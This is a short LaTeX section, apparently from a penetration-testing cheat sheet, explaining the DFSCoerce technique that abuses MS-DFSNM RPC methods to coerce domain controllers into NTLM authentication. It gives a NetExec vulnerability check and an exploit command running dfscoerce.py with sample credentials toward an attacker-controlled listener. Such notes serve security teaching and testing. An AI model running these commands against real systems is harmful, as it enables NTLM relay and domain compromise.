\section{DFSCoerce (MS-DFSNM)}
MS-DFSNM is Microsoft's Distributed File System Namespace Management protocol. It provides an RPC interface for administering DFS configurations (\hred{https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/95a506a8-cae6-4c42-b19d-9c1ed1223979}{docs.microsoft.co}m) and is available as an RPC interface. That interface is available through the \verb+\pipe\netdfs+ SMB named pipe.

Similarly to other MS-RPC abuses, this works by using a specific method relying on remote address

DFSCoerce abuses the \verb+NetrDfsAddStdRoot+ and \verb+NetrDfsRemoveStdRoot+ methods of Distributed File System (DFS): Namespace Management Protocol (MS-DFSNM).

{\bf It is worth noting this coercion method only works against domain controllers.}

A valid domain credentials is needed to use it 

DFSCoerce does not seem capable of coercing HTTP NTLM authentication.

check vulnerable:
\begin{verbatim}
nxc smb <target> -M dfscoerce -o LISTENER=<ip>
\end{verbatim}


Exploit:
\begin{verbatim}
python3 dfscoerce.py -u 'plaintext$' -p 'o6@ekK5#rlw2rAe' <attacker_ip> <target_ip>
\end{verbatim}


